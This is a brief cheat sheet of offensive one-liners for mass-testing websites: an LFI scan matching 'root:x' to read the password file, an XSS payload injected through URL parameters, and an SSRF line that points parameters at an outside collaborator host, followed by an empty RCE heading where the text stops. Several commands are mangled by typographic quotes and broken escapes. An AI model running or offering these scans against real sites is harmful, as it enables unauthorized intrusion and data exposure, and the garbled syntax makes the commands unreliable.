## LFI Oneliner:
findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done

## XSS Oneliner:

cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done

## SSRF Oneliner:
findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep “=” | qsreplace http://YOUR.burpcollaborator.net

## RCE Oneliner:
